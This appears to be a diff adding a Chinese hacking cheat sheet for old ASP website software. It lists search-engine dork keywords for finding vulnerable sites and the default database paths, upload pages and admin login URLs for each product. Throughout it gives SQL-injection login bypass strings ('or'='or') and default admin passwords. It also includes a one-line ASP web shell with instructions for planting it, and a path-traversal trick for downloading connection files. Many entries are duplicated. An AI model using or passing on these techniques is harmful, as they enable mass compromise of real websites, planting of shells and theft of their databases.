@@ -1,0 +1,326 @@
+
+企业邮局企业荣誉营销网络产品分类信息反馈联系我们收藏本站
+后辍: /db/com02.mdb
+上传页：/upfile_photo.asp
+默认密码：admin/login.asp
+
+关键字：
+
+飞越公司企业网站管理系统
+后辍:databases\21asp.mdb
+后台：admin/Login.asp
+默认密码：admin-admin 
+
+关键字：
+
+ powered by mypower 
+后缀： /upfile_photo.asp 直接上传
+
+关键字：
+
+Power WenDay Ver1.0
+后缀： /db/PW_SYS_Data.mdb
+
+关键字：
+
+powered by WEBBOY
+后缀： /upfile.asp 
+
+关键字：
+
+Powered By ：SMT Version 5.0
+后缀： /bbs/upfile.asp /upfile_flash.asp 
+关键字：
+
+team5 studio all rights reserved
+后缀： /data/team.mdb
+关键字：
+
+传奇**
+后缀： /msmirdata/msmirArticle.mdb(默认数据库) 
+后台管理地址:http;//您的域名/msmiradmin/
+关键字：
+
+同城约会 贺卡传情 情感随笔 热门投票
+添加: /admin/upload_file.asp (上传)
+关键字：
+
+ 公司后台
+后缀： /manage/Login.asp （用"or"="or"）
+关键字：
+
+企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理 
+后缀： /admin/login.asp (后台管理地址,管理员帐号密码=admin)
+关键字：
+
+by wygk
+后缀：/data/scadata.mdb
+关键字：
+
+ Power System Of Article Management Ver 3.0 Build 20030628
+添加: /database\yiuwekdsodksldfslwifds.mdb (后台的后缀全是/admin_index.asp)
+
+关键字：
+
+ Foosun
+添加: /Foosun_Data/FS400.mdbAdmin/login.asp (后台的后缀全是admin/login.asp)
+关键字：
+
+Powered By Kesion Inc
+默认数据库 ks_data/ks_database.mdb
+关键字：
+
+顾客您好，购买商品请先登录
+后缀：/data/5757net-shop.asp
+关键字：
+
+　今日文章 文章总数：今日访问：访问总数：会员总数： 最近会员： 当前在线：
+后缀：/ADMIN\DATA\news30000.mdb
+关键字：
+
+您是如何知道本网站的？ 从门户网站搜索 网络广告或友情链接 熟人介绍 平面媒体 本公司资料或名片 业务交流中告知
+后缀: /admin/upfile_flash.asp (挖掘鸡选“购物商城类”直接上传)
+关键字：
+
+inurl:bigclass.asp 
+后缀: /admin/data/xsjnews.asa (默认数据库)
+关键字：
+
+inurl: linktianjia.asp
+后缀: /Manage/login.asp (帐号密码:'or'='or')
+关键字：
+
+本站部分信息由企业自行提供，该企业负责信息内容的真实性、准确性和合法性
+默认数据库路径：/data/scadata.mdb 默认后台： /admin/index.asp
+关键字：
+
+您现在所在的位置: 首页 >> 高贝主页
+后缀： /upfile_photo.asp (明小子直接上传)
+关键字：
+
+Powered By Dvbbs Version 7.1.0 Sp1
+后缀： /Databackup/dvbbs7_Backup.mdb 
+关键字：
+
+ Dvbbs.ASP 8.0.0
+后缀： /Databackup/dvbbs7_Backup.mdb 
+关键字：
+
+inurl:hack.asp
+后缀:system/mdb/system.asp(默认数据库)
+关键字：
+
+程序版本ower WenDay Ver1.0
+后缀： /db/PW_SYS_Data.mdb
+关键字：
+
+powered by WEBBOY
+后缀： /upfile.asp 
+关键字：
+
+Powered By ：SMT Version 5.0
+后缀： /bbs/upfile.asp /upfile_flash.asp 
+关键字：
+
+team5 studio all rights reserved
+后缀： /data/team.mdb
+关键字：
+
+传奇**
+后缀： /msmirdata/msmirArticle.mdb(默认数据库) 
+后台管理地址:http;//您的域名/msmiradmin/
+关键字：
+
+同城约会 贺卡传情 情感随笔 热门投票
+添加: /admin/upload_file.asp (明小子上传)
+关键字：
+
+ 公司后台
+后缀： /manage/Login.asp （用"or"="or"）
+关键字：
+
+企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理 
+后缀： /admin/login.asp (后台管理地址,管理员帐号密码=admin)
+关键字：
+
+by wygk
+后缀：/data/scadata.mdb
+关键字：
+
+ Power System Of Article Management Ver 3.0 Build 20030628
+添加: /database\yiuwekdsodksldfslwifds.mdb (后台的后缀全是/admin_index.asp)
+关键字：
+
+ Foosun
+添加: /Foosun_Data/FS400.mdbAdmin/login.asp (后台的后缀全是admin/login.asp)
+关键字：
+
+Powered By Kesion Inc
+默认数据库 ks_data/ks_database.mdb
+关键字：
+
+ inurl:qq.txt （啊拉）
+inurl:Mz.txt （极限居）
+inurl??QCJB.txt （QQ冲击波）
+inurl:qqnum.txt （完美）
+
+
+
+
+
+
+
+
+默认数据库: Databases/myszw.mdb Databases/myszw1.mdb 
+
+上传 upload_Photo.asp?PhotoUrlID=3 upload_Photo.asp?PhotoUrlID=1
+---------------------------------------------------- 
+关键字：
+
+网站建设公司企业网站管理系统 
+后缀： admin/login.asp 
+--------------------------------------- 
+关键字：
+
+网梦购物系统 gCS<iBT 7 
+工具： 挖掘鸡 后缀：/admin/login.asp 
+------------------------------------------------ 
+上传后缀：upfile_photo.asp
+
+upfile_softpic.asp
+
+upfile_adpic.asp
+upfile.asp 
+upfile_flash.asp
+upload.asp 
+Upfile_Article.asp 
+Upfile_AdPic.asp 
+Upfile_OrderPic.asp
+Upfile_AdPia.asp 
+Upfile_Articla.asp
+Upfile_Dialog.asp 
+关键字：
+
+1。Power System Of Article Management Ver 3.0 Build 20030628. Powered by WEBBOY. ?
+2。Power System Of Article Management Ver 3.0 
+3。Power System Of Article Management. 2.0 Build Powered by Webboy 
+4。Power System Of Article Management. 2.0 Build Powered by Butian 
+5。Powered By ：SMT Version 5.0 
+Powered By ：SMT Version 5.1 
+------------------------------------------------------- 
+一句话木马 
+GOOGLE里搜索关键字：
+
+ 
+上面的这个名字只是该留言者使用的昵称,不代表任何管理员身份! 
+把index.asp换成 mdb/vcsbook.asp 
+代码：<%execute request "value" %> 
+--------------------------------------- 
+关键子：inurl:Went.asp 
+后缀：manage/login.asp 
+密码：'or''=''or' 
+============================ 
+关键字：
+
+acblog 
+后缀：blogdata/acblog.asa 默认数据库。 
+======================================= 
+关键字：
+
+Copyright ? 2005-2008??Power
+
+然后写入默认数据库：databass/datashop.asp 
+在网址后面加上主页后面加上：linktianjia.asp 
+申请连接输入一句话代码：<%execute request "value" %> 
+或者点下面的管理入口 密码：'or'='or'
+
+一句话连接的时候在网站后面加上：databass/datashop.asp 
+======================================================== 
+关键词 co net mib ver 1.0 design by hypo 
+ 
+密码 'or'='or' 
+============================================== 
+新云漏洞：把/flash/downfile.asp?url=uploadfile/../../conn.asp提交到网站根目录。就可以下载conn.asp 找到数据库地址比如 www.123.com 这个站 那么数据库地址就是http://www.123.com/database\xzws.mdb 大家时常碰到数据库如果前面或者中间+了# 可以用%23替换就可以下载了如:#xzws.mdb 改成%23xzws.mdb 那么数据库就是http://www.123.com/database\%23xzws.mdb然后下载 数据库 
+======================================================
+ 
+关键字：
+
+Powered by BBSXP 7.00 
+后缀：DataBase\BBSXP7.mdb 
+默认后台：/bbsxp/Login.asp 
+===================================== 
+关键字：
+
+Management Ver 3.0 Build 20030628 
+后缀：upload.asp 
+一：挖掘鸡 t0/fF'G ZD 
+ 
+=========================
+
+搜索：Co Net MIB Ver 1.0网站后台管理系统 
+=============================================== 
+用到工具:挖掘鸡 
+后缀添加:admin/login.asp
+搜索关键词:申请会员有什么好处?
+密码：'or'='or' 
+================================= 
+啊D注入工具--百度----关键子：admin
+==================================== 
+挖掘鸡关键字：
+
+Powered by WEBBOY页面：/upfile.asp 
+挖掘鸡关键字：
+
+Powered by mypower 后缀：upfile_photo.asp
+upfile_softpic.asp 
+upfile_adpic.asp 
+======================
+关键字：
+
+Power BY:VenShop V7.01 Copyright:VenShop.Com 
+密码：'or'='or' 
+======================= ;:
+关键字：
+
+powered by mypower 
+漏洞页面:upfile_photo.asp 
+Upfile_Soft.asp 
+upfile_adpic.asp 
+upfile_softpic.asp 
+=============================== 
+关键字：
+
+选购->加入购物车->去收银台->确认收货人信息->选付款方式->选配送方式->在线支付或下单后汇款->汇款确认->发货->完成 
+漏洞页面:upload.asp 
+upfile_flash.asp 
+============================= 
+网上搜索 inurl:manage/login.asp 
+====================================== 
+关键字??ower BY:VenShop V7.01 
+后台地址:ad_login.asp 
+密码：'or'='or' 
+==================== 
+关键字：
+
+Powered by WEBBOY 
+后缀：/upfile.asp
+工具：明小子上传 
+==================== 
+关键词：inurl: asp?=数字 
+inurl: php?=数字 
+===========================
+关键字：
+
+went.asp 
+后缀：manage/login.asp 
+========================== 
+添加后缀/msmir_net.mdb 
+搜索：inurl:Msmir_DownLoads 
+=============================== 
+关键字Powered By ：SMT Version 5.0 
+后缀：upfile_flash.asp 
+=========================== 
+复制代码
+ 
+
+网站上面的Shell 漏缀
